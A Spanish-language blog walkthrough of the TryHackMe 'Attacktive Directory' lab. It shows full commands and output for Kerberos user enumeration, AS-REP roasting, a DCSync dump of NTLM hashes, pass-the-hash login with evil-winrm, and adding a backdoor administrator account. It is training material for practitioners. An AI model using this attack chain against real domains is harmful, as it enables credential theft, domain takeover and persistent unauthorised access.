---
layout: post
title: Attacktive Directory - THM
description: Attacktive Directory - THM
tags: [AD,Windows,Kerberos]
---

![logo](/assets/imgs/ada/logo.png)

## Enumeración de puertos

Haciendo uso de `nmap` realizamos un escaneo agresivo para el descubrimiento de puertos.

```
> nmap -sV -sC -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49667,49674,49675,49676,49677,49689,49695,49793 -oN targeted 10.10.129.64
```

```
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-08-30 07:06:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49793/tcp open  msrpc         Microsoft Windows RPC
```

----

La salida devuelve 27 puertos descubiertos.  
Sólo me centraré en los puertos mas populares y vulnerables que se pueda visualizar en la salida anterior.

- Puerto **88** del servicio Kerberos es una ruta potencial en el que se pueda conseguir usuarios del dominio.
- Puerto **445** correspondiente al servicio de `samba`, que nos puede ayudar a encontrar archivos compartidos
- Puerto **5985** perteneciente al servicio `winrm`, que en caso de tener credenciales válidas de un usuario nos podría permitir la gestión remota del servidor.
- La salida de nmap también proporciona un nombre DNS (`spookysec.local`) que se agregará al archivo `/etc/hosts` para que nos resuelva la IP del objetivo.
- Los demás puertos no los tomaré en consoderación porque son irrelevantes para explotar la máquina.

### Fuerza bruta a kerberos

> Kerberos es un protocolo de autenticación, quiere decir que el protocolo se encarga de identificar a cada usuario, a través de una contraseña colo conocida por este, pero no determina a qué servicio puede acceder o no dicho usuario.

```
❯ kerbrute userenum -d spookysec.local --dc spookysec.local users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                      

Version: v1.0.3 (9dad6e1) - 12/06/21 - Ronnie Flathers @ropnop

2021/12/06 13:03:02 >  Using KDC(s):
2021/12/06 13:03:02 >   spookysec.local:88

2021/12/06 13:03:02 >  [+] VALID USERNAME:       backup@spookysec.local
2021/12/06 13:03:02 >  [+] VALID USERNAME:       James@spookysec.local
2021/12/06 13:03:03 >  [+] VALID USERNAME:       Robin@spookysec.local
2021/12/06 13:03:03 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2021/12/06 13:03:03 >  [+] VALID USERNAME:       JAMES@spookysec.local
2021/12/06 13:03:03 >  [+] VALID USERNAME:       darkstar@spookysec.local
2021/12/06 13:03:03 >  [+] VALID USERNAME:       administrator@spookysec.local
2021/12/06 13:03:03 >  [+] VALID USERNAME:       robin@spookysec.local
2021/12/06 13:03:03 >  [+] VALID USERNAME:       paradox@spookysec.local
2021/12/06 13:03:03 >  [+] VALID USERNAME:       Administrator@spookysec.local
2021/12/06 13:03:03 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2021/12/06 13:03:03 >  [+] VALID USERNAME:       Paradox@spookysec.local
2021/12/06 13:03:03 >  [+] VALID USERNAME:       ori@spookysec.local
2021/12/06 13:03:03 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2021/12/06 13:03:08 >  [+] VALID USERNAME:       james@spookysec.local
2021/12/06 13:03:08 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2021/12/06 13:03:08 >  Done! Tested 16 usernames (16 valid) in 6.011 seconds
```

>  Al ejecutar un ataque de fuerza bruta a kerberos es posible bloquear cuentas de usuario del dominio objetivo

Se ha encontrado 16 usuarios válidos.  

Lo siguiente es probar si alguno de estos usuarios es vulnerable al atque **ASREP Roasting**

### ASREP Roast

> ASREP Roasting ocurre cuando una cuenta de usuario tiene el privilegio establecido "Does not require Pre-Authentication", quiere decir que la cuenta **NO** necesita proporcionar una identificación válida antes de solicitar un Ticket Kerberos.

`GetNPUsers.py` es un script de impaket que nos ayudará a recolectar mensajes AS_REP sin pre-autenticación.

```
❯ GetNPUsers.py spookysec.local/ -no-pass -usersfile usersFound.txt
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:028b70ff59e26daf53850da8207bf3d7$aebdeae0daec7e12d0d398174d8e010aba0147ef3f8a1a951629ef004f0ee38936f42e8268b472a4c4d4f8da9bed4d5c1f14620f180c519318addfe25eae81a8720c13c6f225c96f9d4121e09a7c2c63027bcb9206cd9433ab159aeb226b51141da2157323d8cd57d5218870b18588fd8494011c51844af80c14a657461cbbad34ddea7978f4608d9c04a818dbdfef1d9110a3076959ecfd5dd804f72ad932eaa6cc1d73d3d007c6a00801b7e2fb9239acee0b0bea212103f8b7bc0e240b2977dde71d4c916641617cf4b43a7acc0a19ede934667ef36cfd369d1edd3ef4a526b786ac796a6b7ccd2ab86b6c39d463e21394
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARKSTAR doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROBIN doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Obtenido el hash del usuario `svc-admin` aplico fuerza bruta para obtener la contraseña.

![john](/asset/imgs/ada/john.png)

Con la herramienta `crackmapexec` podemos validar si el usuario encontrado es correcto o es un falso positivo.

```
❯ crackmapexec smb 10.10.185.250 -u svc-admin -p management2005
SMB         10.10.185.250   445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.185.250   445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
```

La salida anterior nos dice que el usuario es válido en el dominio `spookysec.local` pero no tenemos capacidad de ejecutar comandos como ese usuario.

#### Enumeración de recursos

Como tenemos credenciales para el usuario svc-admin listamos recursos que se encuentren disponibles.

```
❯ smbclient -L //spookysec.local -U svc-admin%management2005

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```

Dentro de la unidad compartida `backup` se encontrará un archivo llamado `backup_credentials.txt` codificado en base 64 el cual tendrá las credenciales para el usuario **backup**.  
Las demás comparticiones son irrelevantes y solo conduciran a una Rabbit Hole

Credenciales para el usuario `backup`

```
backup@spookysec.local:backup2517860
```
----

En la **tarea 7** de la room nos menciona lo siguiente: 

> Esta cuenta tiene un permiso único que permite sincronizar todos los cambios de Active Directory con esta cuenta de usuario.

Con esta información podemos aplicar un ataque DCSync

> DCSync implica tener permisos sobre el dominio en sí: **DS-Replication-Get-Changes** y **Replecating Directory Changes in Filtered Set**  
> De forma predeterminada solo los grupos de **administradores de dominio,  administradores de empresa, administradores y controladores de dominio** tienen los privilegios necesarios.

## Ataque DCSync

Para ejecutar el ataque de forma remota usearé **secretsdump.py** de impacket, esto listará todos los hashes NTLM de cuentas del directorio activo.

```
❯ secretsdump.py -just-dc backup:backup2517860@10.10.185.250                                               
Impacket v0.9.23.dev1+20210427.174742.fc72ebad - Copyright 2020 SecureAuth Corporation                     
                                                                                                           
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                              
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                       
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                             
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::                            
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::  
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::            
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::         
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::         
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::              
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::            
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:ab0e7e804fa28a592b2df78228913813:::
[*] Kerberos keys grabbed
[...]
```

Obtenido los hashes de usuarios del dominio puedo autenticarme a través del servicio `winrm` como usuario `administrator`

```
❯ evil-winrm -i 10.10.104.53 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
```

![admin](/assets/imgs/ada/admin.png)

----

### Opcional

## Acceso Remoto

Una forma de acceder a la máquina Windows de forma remota es creandonos un usuario con privilegios de administrador con los siguientes comandos.

```
net user haxor haxor123 /add
net localgroup "Administrators" haxor /add
```

Verificamos el usuario creado

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            a-spooks                 backup
breakerofthings          darkstar                 Guest
haxor                    horshark                 james
krbtgt                   Muirland                 optional
Ori                      paradox                  robin
sherlocksec              skidy                    svc-admin
```

Finalmente accedemos al sistema.

```
xfreerdp /u:haxor /p:haxor123 /v:10.10.104.53
```

![rdp](/assets/imgs/ada/rdp.png)
